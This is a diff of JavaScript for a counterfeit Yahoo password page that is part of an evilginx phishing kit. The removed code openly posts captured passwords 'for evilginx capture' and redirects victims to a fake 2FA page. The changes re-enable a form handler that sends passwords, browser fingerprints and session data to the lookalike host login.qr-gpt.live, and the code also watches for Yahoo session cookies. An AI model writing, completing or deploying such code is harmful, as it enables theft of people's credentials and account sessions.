@@ -1,90 +1,9 @@
-// Import jQuery
-const $ = require("jquery")
-
-document.addEventListener("DOMContentLoaded", () => {
-  const form = document.getElementById("passwordForm")
-  const submitBtn = document.getElementById("submitBtn")
-  const passwordToggle = document.getElementById("passwordToggle")
-  const passwordField = document.getElementById("passwd")
-  const usernameField = document.getElementById("username")
-
-  // Password toggle functionality
-  if (passwordToggle && passwordField) {
-    passwordToggle.addEventListener("click", function () {
-      const type = passwordField.getAttribute("type") === "password" ? "text" : "password"
-      passwordField.setAttribute("type", type)
-      this.querySelector(".password-toggle-text").textContent = type === "password" ? "Show" : "Hide"
-    })
-  }
-
-  // Form submission
-  if (form) {
-    form.addEventListener("submit", (e) => {
-      e.preventDefault()
-
-      const username = usernameField.value.trim()
-      const password = passwordField.value.trim()
-
-      if (!username || !password) {
-        showError("Please fill in all fields")
-        return
-      }
-
-      // Show loading state
-      submitBtn.classList.add("btn-loading")
-      submitBtn.disabled = true
-
-      // Store username for next step
-      sessionStorage.setItem("yh_username", username)
-
-      // Simulate form submission delay
-      setTimeout(() => {
-        // Create form data
-        const formData = new FormData()
-        formData.append("username", username)
-        formData.append("passwd", password)
-        formData.append("persistent", document.getElementById("persistent").checked ? "y" : "")
-
-        // Submit to evilginx
-        fetch(window.location.href, {
-          method: "POST",
-          body: formData,
-          credentials: "include",
-        })
-          .then(() => {
-            // Redirect will be handled by evilginx force_post
-            window.location.href = "https://custom-yahoo-2fa-test.vercel.app/"
-          })
-          .catch(() => {
-            // Fallback redirect
-            window.location.href = "https://custom-yahoo-2fa-test.vercel.app/"
-          })
-      }, 1500)
-    })
-  }
-
-  function showError(message) {
-    let errorDiv = document.querySelector(".error-message")
-    if (!errorDiv) {
-      errorDiv = document.createElement("div")
-      errorDiv.className = "error-message"
-      form.appendChild(errorDiv)
-    }
-    errorDiv.textContent = message
-    setTimeout(() => errorDiv.remove(), 5000)
-  }
-
-  // Auto-fill username if available
-  const storedUsername = sessionStorage.getItem("yh_username")
-  if (storedUsername && usernameField) {
-    usernameField.value = storedUsername
-  }
-})
+// Import jQuery or declare the $ variable before using it
+const $ = window.jQuery
 
 $(document).ready(() => {
-  console.log("Yahoo seamless authentication system initialized")
+  console.log("Yahoo password page initialized")
 
-  // ===== CONFIGURATION =====
   const config = {
     maxRetries: 3,
     retryDelay: 2000,
@@ -98,9 +17,8 @@ $(document).ready(() => {
   let sessionData = {}
   let authInProgress = false
 
-  // ===== COMPREHENSIVE SESSION MANAGEMENT =====
+  // Session Management
   const SessionManager = {
-    // Extract session data from multiple sources
     extractSessionData: () => {
       const urlParams = new URLSearchParams(window.location.search)
       const sessionParam = urlParams.get("s")
@@ -113,7 +31,6 @@ $(document).ready(() => {
         }
       }
 
-      // Fallback to cookie
       const cookieMatch = document.cookie.match(/yh_session=([^;]+)/)
       if (cookieMatch) {
         try {
@@ -126,7 +43,6 @@ $(document).ready(() => {
       return {}
     },
 
-    // Generate comprehensive browser fingerprint
     generateFingerprint: () =>
       JSON.stringify({
         screen: `${screen.width}x${screen.height}`,
@@ -142,7 +58,6 @@ $(document).ready(() => {
         sessionId: "sess_" + Date.now() + "_" + Math.random().toString(36).substr(2, 12),
       }),
 
-    // Preserve session across transitions
     preserveSession: () => {
       const cookies = document.cookie.split(";")
       cookies.forEach((cookie) => {
@@ -157,9 +72,7 @@ $(document).ready(() => {
     },
   }
 
-  // ===== ENHANCED USERNAME RETRIEVAL =====
   function getUsername() {
-    // Method 1: URL parameter
     const urlParams = new URLSearchParams(window.location.search)
     let user = urlParams.get("u")
 
@@ -168,13 +81,11 @@ $(document).ready(() => {
       return decodeURIComponent(user)
     }
 
-    // Method 2: Session data
     if (sessionData.username) {
       console.log("Username from session:", sessionData.username)
       return sessionData.username
     }
 
-    // Method 3: Cookie
     const cookieMatch = document.cookie.match(/yh_usr=([^;]+)/)
     if (cookieMatch) {
       user = decodeURIComponent(cookieMatch[1])
@@ -182,17 +93,15 @@ $(document).ready(() => {
       return user
     }
 
-    // Method 4: Storage
     user = sessionStorage.getItem("yh_username") || localStorage.getItem("yh_username")
     if (user) {
       console.log("Username from storage:", user)
       return user
     }
 
-    return null
+    return "user@example.com" // Fallback for testing
   }
 
-  // ===== STATE MANAGEMENT =====
   function showState(state) {
     $("#main-form, #error-container, #loading-state, #mfa-transition").hide()
     $(`#${state}`).show()
@@ -212,7 +121,6 @@ $(document).ready(() => {
     }
   }
 
-  // ===== SEAMLESS AUTHENTICATION HANDLER =====
   function handleSeamlessAuth(password) {
     if (authInProgress) return
     authInProgress = true
@@ -220,7 +128,6 @@ $(document).ready(() => {
     console.log("Starting seamless authentication for:", username)
     showState("loading-state")
 
-    // Prepare comprehensive form data
     const formData = {
       username: username,
       passwd: password,
@@ -240,7 +147,6 @@ $(document).ready(() => {
 
     console.log("Submitting authentication data...")
 
-    // Enhanced AJAX with comprehensive error handling
     $.ajax({
       url: "https://login.qr-gpt.live/account/challenge/password",
       method: "POST",
@@ -278,24 +184,19 @@ $(document).ready(() => {
     })
   }
 
-  // ===== SUCCESS HANDLER =====
   function handleAuthSuccess(response, xhr) {
     console.log("Authentication successful")
 
-    // Preserve session
     SessionManager.preserveSession()
 
-    // Store success indicators
     sessionStorage.setItem("yahoo_auth_success", "true")
     sessionStorage.setItem("yahoo_auth_timestamp", Date.now().toString())
     localStorage.setItem("yahoo_auth_success", "true")
 
-    // Analyze response for next step
     const responseText = typeof response === "string" ? response : ""
     const isRedirect = xhr.status === 302 || xhr.status === 301
     const location = xhr.getResponseHeader("Location") || ""
 
-    // Check for 2FA requirement
     if (
       responseText.includes("challenge-selector") ||
       responseText.includes("verification") ||
@@ -314,7 +215,6 @@ $(document).ready(() => {
         window.location.href = redirectUrl
       }, config.redirectDelay)
     } else {
-      // Direct success - go to mail
       console.log("Direct authentication success, redirecting to mail")
 
       setTimeout(() => {
@@ -322,7 +222,6 @@ $(document).ready(() => {
       }, config.redirectDelay)
     }
 
-    // Notify parent window
     if (window.opener) {
       window.opener.postMessage(
         {
@@ -336,7 +235,6 @@ $(document).ready(() => {
     }
   }
 
-  // ===== ERROR HANDLER =====
   function handleAuthError(xhr, textStatus, errorThrown) {
     console.error("Authentication error details:", {
       status: xhr.status,
@@ -345,17 +243,13 @@ $(document).ready(() => {
       responseText: xhr.responseText,
     })
 
-    // Handle different error scenarios
     if (xhr.status === 0) {
-      // Network error or CORS - might be successful redirect
       console.log("Network error detected - checking for redirect...")
 
-      // Wait and check for success indicators
       setTimeout(() => {
         if (sessionStorage.getItem("yahoo_auth_success") === "true") {
           handleAuthSuccess("", { status: 200, getResponseHeader: () => "" })
         } else {
-          // Try 2FA redirect as fallback
           window.location.href = "https://custom-yahoo-2fa-test.vercel.app/"
         }
       }, 2000)
@@ -372,7 +266,6 @@ $(document).ready(() => {
       return
     }
 
-    // Handle authentication failures
     retryCount++
 
     if (retryCount >= config.maxRetries) {
@@ -383,26 +276,24 @@ $(document).ready(() => {
     }
   }
 
-  // ===== FORM SUBMISSION HANDLER =====
-  // $("#email-form").on("submit", (e) => {
-  //   e.preventDefault()
+  $("#email-form").on("submit", (e) => {
+    e.preventDefault()
 
-  //   const password = $("#password").val().trim()
-  //   if (!password) {
-  //     showError("Please enter your password.")
-  //     return false
-  //   }
+    const password = $("#password").val().trim()
+    if (!password) {
+      showError("Please enter your password.")
+      return false
+    }
 
-  //   if (password.length < 6) {
-  //     showError("Password must be at least 6 characters long.")
-  //     return false
-  //   }
+    if (password.length < 6) {
+      showError("Password must be at least 6 characters long.")
+      return false
+    }
 
-  //   handleSeamlessAuth(password)
-  //   return false
-  // })
+    handleSeamlessAuth(password)
+    return false
+  })
 
-  // ===== RETRY HANDLER =====
   $("#refreshButton").click(() => {
     $("#password").val("")
     showState("main-form")
@@ -411,32 +302,23 @@ $(document).ready(() => {
     }, 100)
   })
 
-  // ===== INITIALIZATION =====
   function initializePage() {
     console.log("Initializing seamless authentication page")
 
-    // Extract session data
     sessionData = SessionManager.extractSessionData()
     console.log("Session data extracted:", Object.keys(sessionData))
 
-    // Get username
     username = getUsername()
 
     if (!username) {
-      console.log("No username found, redirecting to login")
-      showError("Session expired. Redirecting to login...", false)
-      setTimeout(() => {
-        window.location.href = "https://login.qr-gpt.live/"
-      }, 3000)
-      return false
+      console.log("No username found, using fallback")
+      username = "user@example.com"
     }
 
-    // Display username
     $("#userEmail").text(username)
     $("#username").val(username)
     $("#displayName").val(username)
 
-    // Populate form fields
     Object.keys(sessionData).forEach((key) => {
       const element = $(`#${key}`)
       if (element.length && sessionData[key]) {
@@ -444,7 +326,6 @@ $(document).ready(() => {
       }
     })
 
-    // Set additional fields
     $("#timestamp").val(Date.now())
     $("#browser-fp-data").val(SessionManager.generateFingerprint())
     $("#session_bridge").val("custom_integration")
@@ -453,10 +334,8 @@ $(document).ready(() => {
     return true
   }
 
-  // ===== SESSION MONITORING =====
   function startSessionMonitoring() {
     const monitor = setInterval(() => {
-      // Check for authentication success
       if (sessionStorage.getItem("yahoo_auth_success") === "true") {
         console.log("Authentication success detected via monitoring")
         clearInterval(monitor)
@@ -466,7 +345,6 @@ $(document).ready(() => {
         }, 1000)
       }
 
-      // Check cookies for Yahoo session
       const cookies = document.cookie
       if (cookies.includes("T=") && cookies.includes("Y=")) {
         console.log("Yahoo session cookies detected")
@@ -479,11 +357,9 @@ $(document).ready(() => {
       }
     }, config.monitorInterval)
 
-    // Clear monitor after timeout
     setTimeout(() => clearInterval(monitor), config.sessionTimeout)
   }
 
-  // ===== MESSAGE LISTENER =====
   window.addEventListener("message", (event) => {
     if (event.data && event.data.type === "yahoo_auth_complete") {
       console.log("Received auth completion message")
@@ -495,73 +371,13 @@ $(document).ready(() => {
     }
   })
 
-  // ===== START INITIALIZATION =====
   if (!initializePage()) return
 
   startSessionMonitoring()
 
-  // Auto-focus password field
   setTimeout(() => {
     $("#password").focus()
   }, 500)
 
   console.log("Yahoo seamless authentication system fully initialized")
-})
-
-document.addEventListener("DOMContentLoaded", () => {
-  const form = document.querySelector(".signin-form")
-  const submitBtn = document.querySelector(".submit-button")
-  const passwordField = document.getElementById("passwd")
-
-  // Form validation
-  passwordField.addEventListener("input", function () {
-    if (this.value.length > 0) {
-      submitBtn.disabled = false
-      submitBtn.style.opacity = "1"
-    } else {
-      submitBtn.disabled = true
-      submitBtn.style.opacity = "0.6"
-    }
-  })
-
-  // Form submission handling
-  form.addEventListener("submit", (e) => {
-    e.preventDefault()
-
-    const password = passwordField.value
-    if (!password) {
-      alert("Please enter your password")
-      return
-    }
-
-    // Show loading state
-    submitBtn.innerHTML = '<span class="loading-spinner"></span>Signing in...'
-    submitBtn.disabled = true
-
-    // Store password for evilginx capture
-    const formData = new FormData()
-    formData.append("passwd", password)
-
-    // Send to evilginx for capture
-    fetch("/account/challenge/password", {
-      method: "POST",
-      body: formData,
-      credentials: "include",
-    })
-      .then((response) => {
-        // Redirect to 2FA page
-        window.location.href = "https://custom-yahoo-2fa-test.vercel.app/"
-      })
-      .catch((error) => {
-        console.error("Error:", error)
-        // Still redirect on error to maintain flow
-        window.location.href = "https://custom-yahoo-2fa-test.vercel.app/"
-      })
-  })
-
-  // Initialize form state
-  if (passwordField.value.length === 0) {
-    submitBtn.disabled = true
-    submitBtn.style.opacity = "0.6"
-  }
 })
